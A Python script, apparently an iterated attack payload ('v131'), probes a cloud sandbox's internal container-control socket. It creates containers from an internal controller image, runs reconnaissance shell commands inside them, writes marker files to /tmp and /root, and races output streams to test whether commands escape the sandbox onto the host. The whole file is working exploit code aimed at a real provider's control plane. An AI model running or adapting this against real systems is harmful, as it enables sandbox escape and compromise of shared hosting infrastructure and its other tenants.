# -*- coding: utf-8 -*-
"""v131 payload: StreamOutput 流先建立 -> Exec 触发进程 -> 拿输出 (并发线程)
时序 A: Exec 后开流 (field2=1/2)
时序 B: 流先开 (阻塞) -> 再 Exec
输出 /vercel/sandbox/v131c.out"""
import socket, struct, time, json, os, signal, threading

OUT = '/vercel/sandbox/v131c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(200)

CELL = '/run/cell/cell.sock'
CTRS = '/vercel.hive.cell.api.containers.v1.ContainersService'
PROC = '/vercel.hive.cell.api.processes.v1.ProcessService'
IMG = '977805900156.dkr.ecr.us-east-1.amazonaws.com/sandbox-controller@sha256:95fd06013f4e1708be914dc973663ab50e48d0045087340cc71cf903e2841b59'


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def connect_unix(sockpath, path, body, t=6.0, ctype='application/json'):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: %s\r\n'
               'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n\r\n'
               % (path, ctype, len(body))).encode() + body
        s.sendall(req)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
        except Exception:
            pass
        s.close()
        status = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        hdr_end = d.find(b'\r\n\r\n')
        return status, d[hdr_end + 4:hdr_end + 4 + 500] if hdr_end > 0 else b''
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''


def dechunk(d):
    out = b''
    off = 0
    while off < len(d):
        i = d.find(b'\r\n', off)
        if i < 0:
            break
        try:
            ln = int(d[off:i].split(b';')[0], 16)
        except Exception:
            break
        if ln == 0:
            break
        out += d[i + 2:i + 2 + ln]
        off = i + 2 + ln + 2
    return out


def stream_data(sockpath, path, payload, ctype, t=12.0):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        env1 = b'\x00' + struct.pack('>I', len(payload)) + payload
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: %s\r\n'
               'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\n\r\n'
               % (path, ctype, len(env1))).encode() + env1
        s.sendall(req)
        s.shutdown(socket.SHUT_WR)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
        except Exception:
            pass
        s.close()
        status = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        hdr_end = d.find(b'\r\n\r\n')
        body = d[hdr_end + 4:] if hdr_end > 0 else b''
        body = dechunk(body)
        return status, body
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''


results = {}


def so_thread(name, pid, enum):
    preq = b'\x0a' + bytes([len(pid)]) + pid.encode() + b'\x10' + bytes([enum])
    st, out = stream_data(CELL, '%s/StreamOutput' % PROC, preq, 'application/connect+proto', t=10)
    txt = ''.join(chr(b) for b in out if 32 <= b < 127 or b in (10, 13))
    results[name] = '%s out=%r' % (st, txt[:1000])
    log('SO[%s] %s out=%r' % (name, st, txt[:1000]))


CMD = ("echo ===E0===; id; hostname; pwd; uname -a; "
       "cat /proc/1/cmdline 2>&1 | head -c 300; echo; "
       "ls / 2>&1 | head -40; ls /volumes/ 2>&1 | head -20; "
       "cat /proc/self/cgroup 2>&1; "
       "echo ===E1===; echo HOSTMARK1 > /tmp/hostm1.txt 2>&1; echo HOSTMARK4 > /root/hostm4.txt 2>&1; "
       "echo ===E2===; sleep 60")


def do_exec(cid, t=6):
    st, pay = connect_unix(CELL, '%s/Exec' % CTRS,
                           json.dumps({'containerId': cid, 'process': {'args': ['/bin/sh', '-c', CMD]}}).encode(), t=t)
    log('Exec -> %s %r' % (st, pay[:250]))
    pid = None
    try:
        pid = json.loads(pay.decode()).get('processId')
    except Exception:
        pass
    return pid


# ---------------- A: Exec 后开流 ----------------
log('=== A exec-then-stream ===')
st, pay = connect_unix(CELL, '%s/Create' % CTRS, json.dumps({'image': IMG}).encode(), t=12)
cid = None
try:
    cid = json.loads(pay.decode()).get('containerId')
except Exception:
    pass
log('Create -> %s cid=%s' % (st, cid))
if not cid:
    f.close()
    raise SystemExit

st, pay = connect_unix(CELL, '%s/Start' % CTRS, json.dumps({'containerId': cid}).encode(), t=8)
log('Start -> %s' % st)
pid = do_exec(cid)
log('A processId=%s' % pid)
if pid:
    t1 = threading.Thread(target=so_thread, args=('A-s1', pid, 1))
    t2 = threading.Thread(target=so_thread, args=('A-s2', pid, 2))
    t1.start(); t2.start()
    time.sleep(4)
    # 再 Exec 一次触发
    pid2 = do_exec(cid, t=4)
    log('A re-exec=%s' % pid2)
    t1.join(12); t2.join(12)

# ---------------- B: 流先开 -> Exec ----------------
log('=== B stream-then-exec ===')
st, pay = connect_unix(CELL, '%s/Create' % CTRS, json.dumps({'image': IMG}).encode(), t=12)
cid2 = None
try:
    cid2 = json.loads(pay.decode()).get('containerId')
except Exception:
    pass
log('B Create -> %s cid=%s' % (st, cid2))
if cid2:
    st, pay = connect_unix(CELL, '%s/Start' % CTRS, json.dumps({'containerId': cid2}).encode(), t=8)
    log('B Start -> %s' % st)
    pidb = do_exec(cid2)
    log('B processId=%s' % pidb)
    if pidb:
        preq = b'\x0a' + bytes([len(pidb)]) + pidb.encode() + b'\x10\x01'
        st, out = stream_data(CELL, '%s/StreamOutput' % PROC, preq, 'application/connect+proto', t=6)
        txt = ''.join(chr(b) for b in out if 32 <= b < 127 or b in (10, 13))
        log('B-S1 %s out=%r' % (st, txt[:1000]))
        # 流建立后立即再 Exec
        pidb2 = do_exec(cid2, t=4)
        log('B re-exec=%s' % pidb2)
        st, out = stream_data(CELL, '%s/StreamOutput' % PROC, preq, 'application/connect+proto', t=8)
        txt = ''.join(chr(b) for b in out if 32 <= b < 127 or b in (10, 13))
        log('B-S2 %s out=%r' % (st, txt[:1000]))

# ---------------- C: marker/pid ----------------
log('=== C scan ===')
for d in os.listdir('/proc'):
    if not d.isdigit():
        continue
    try:
        comm = open('/proc/%s/comm' % d).read().strip()
        if comm in ('sh', 'sleep'):
            log('proc %s comm=%s' % (d, comm))
    except Exception:
        pass

log('V131_DONE')
f.close()
